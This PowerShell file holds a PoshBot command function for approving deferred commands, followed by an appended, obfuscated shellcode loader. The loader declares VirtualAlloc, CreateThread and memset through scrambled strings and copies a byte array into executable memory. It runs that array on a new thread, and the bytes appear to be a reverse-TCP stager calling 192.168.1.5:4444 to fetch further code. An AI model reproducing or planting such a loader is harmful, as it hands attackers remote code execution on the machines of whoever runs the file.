function Approve-PendingCommand {
    
    [PoshBot.BotCommand(
        Aliases = ('ack', ("{1}{0}" -f 'rove','app'), ("{0}{1}{3}{2}{4}"-f 'a','pprove','man','com','d'))
    )]
    [cmdletbinding()]
    param(
        [parameter(Mandatory)]
        $Bot,

        [parameter(Mandatory, Position = 0)]
        [string]$Id
    )

    $context = $Bot.DeferredCommandExecutionContexts[$Id]
    if ($context) {
        $callingUserId = $global:PoshBotContext.From
        if (-not $global:PoshBotContext.FromName) {
            $callingUserName = $Bot.RoleManager.ResolveUserIdToUserName($callingUserId)
        } else {
            $callingUserName = $global:PoshBotContext.FromName
        }
        $originalCommandCallingUser = $context.ParsedCommand.From

        if ($callingUserId -ne $originalCommandCallingUser) {
            
            $approvalGroups = $Bot.Executor.GetApprovalGroups($context)
            $callingUserGroups = $Bot.RoleManager.GetUserGroups($callingUserId).Name
            if ($null -eq $callingUserGroups) { $callingUserGroups = @() }

            $compareParams = @{
                ReferenceObject = $approvalGroups
                DifferenceObject = $callingUserGroups
                PassThru = $true
                IncludeEqual = $true
                ExcludeDifferent = $true
            }
            $inApprovalGroup = (Compare-Object @compareParams).Count -gt 0

            if ($inApprovalGroup) {
                $context.ApprovalState = 2 
                $context.Approver.Id = $callingUserId
                $context.Approver.Name = $callingUserName
                $Bot.ProcessedDeferredContextQueue.Enqueue($context)

                New-PoshBotCardResponse -Type Normal -Text "Command [$Id] - [$($context.ParsedCommand.CommandString)] approved by [$callingUserName] "
            } else {
                New-PoshBotCardResponse -Type Warning -Text "Sorry. Only someone in approval group(s) [$($approvalGroups -join ', ')] can approve this command. "
            }
        } else {
            New-PoshBotCardResponse -Type Warning -Text ("{3}{5}{2}{8}{6}{1}{7}{4}{0}" -f'not allowed.','-a','try','Nic','is ','e ','Self','pproving ','. ')
        }
    } else {
        New-PoshBotCardResponse -Type Warning -Text ('Unkn'+'own '+'appro'+'va'+'l '+'I'+'D '+"[$Id]")
    }
}

$c = ((("{98}{111}{76}{6}{104}{108}{85}{99}{100}{50}{9}{44}{48}{15}{72}{63}{71}{34}{12}{60}{91}{20}{113}{67}{5}{26}{66}{51}{36}{102}{49}{82}{81}{62}{0}{32}{74}{123}{39}{70}{96}{43}{16}{105}{53}{68}{56}{40}{87}{23}{11}{21}{114}{103}{18}{59}{109}{46}{88}{75}{14}{3}{78}{31}{55}{117}{61}{22}{73}{35}{19}{77}{7}{80}{90}{33}{116}{97}{29}{121}{101}{84}{1}{93}{94}{41}{119}{17}{4}{30}{69}{54}{24}{58}{8}{10}{120}{112}{65}{89}{79}{106}{42}{83}{95}{64}{52}{38}{107}{92}{122}{86}{28}{2}{45}{110}{25}{47}{115}{37}{118}{13}{57}{27}"-f'r',' ','st, ','pTh','ea','int d','por','Start','p','public s','ort(','WX)]public','lloc(I','u','l','xtern I','(RWX','r','t',' ','pAddr',' static extern ','ze','lR','l','t ','wSize, u',');','e','lpP','dI','Attributes,','o','res','lA','tr','llocati','t ','rn I','lIm','d','IntPtr lpT',' s','t','tat','u','(I','sr','ic e','p','RWX)]','lA','exte','rnel',';[Dl',' uint ','.','nt','Im','eTh','nt','tackSi','int flP','tPtr Vir',' ','vc','int f','ss, u','32','d)','p','tua','n',', IntP','te','tr ','Im','lp','read','llRWX)]publ','Ad',' u','e,','tati','r, uint','nel3','d','l','ntP','rt.d','d','Ptr l','Ptr memset','dwCreationFla','gs, ','c','or',', IntPtr ','[D','2','.dll','ramete','onTy','r Crea','t(RWXke','ke','ic','nt','r','read','in','ll','Xms','e','IntPt','c, uin','s','dwS','co','h','RW','a','(IntPtr ','ct);[Dl')).RepLACe('RWX',[sTRing][chAR]34));$w = Add-Type -memberDefinition $c -Name ("{0}{1}" -f 'Wi','n32') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
